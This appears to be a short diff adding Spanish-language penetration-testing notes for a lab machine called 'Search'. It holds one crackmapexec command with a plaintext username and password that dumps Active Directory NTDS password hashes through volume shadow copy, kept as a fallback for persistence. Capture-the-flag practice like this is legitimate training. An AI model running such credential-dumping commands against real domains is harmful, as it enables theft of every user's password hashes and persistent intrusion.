@@ -1,0 +1,4 @@
+# Deberemos de tener una credencial que sea administrador
+# Esto se hace para en el caso de que deshabiliten el usuario que estamos usando pues tener los hashes de otros
+# Maquina Search
+crackmapexec smb 10.10.11.129 -u 'tristan.davies' -p 'Rami1234!#' --ntds vss
